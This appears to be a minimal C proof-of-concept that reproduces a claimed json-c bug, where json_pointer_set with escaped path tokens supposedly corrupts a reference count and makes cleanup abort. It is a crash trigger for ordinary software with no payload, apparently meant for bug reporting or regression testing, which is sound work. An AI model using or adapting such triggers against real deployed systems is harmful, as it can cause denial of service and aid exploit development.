/* poc.c - minimal standalone PoC */
#include <stdio.h>
#include <string.h>
#include <json-c/json.h>

int main(void)
{
    /* Build:  { "a/b": { "c~d": 1 } }  (keys chosen so the decoded path hits) */
    json_object *root = json_object_new_object();
    json_object *mid  = json_object_new_object();
    json_object *leaf = json_object_new_int(1);
    json_object_object_add(mid,  "c~d", leaf);
    json_object_object_add(root, "a/b", mid);

    /* Multi-level path. First token "a~1b" decodes (~1 -> '/') to "a/b" which exists;
     * second token "c~0d" decodes (~0 -> '~') to "c~d". */
    const char *path = "/a~1b/c~0d";
    json_object *val  = json_object_new_int(42);
    json_object *pobj = root;

    int rc = json_pointer_set(&pobj, path, val);
    fprintf(stderr, "json_pointer_set rc=%d\n", rc);

    /* Free everything. The refcount has been corrupted by the double decode,
     * so json_object_put() underflows and aborts. */
    json_object_put(val);
    if (pobj != root) json_object_put(pobj);
    json_object_put(root);

    fprintf(stderr, "no crash (bug NOT present)\n");
    return 0;
}
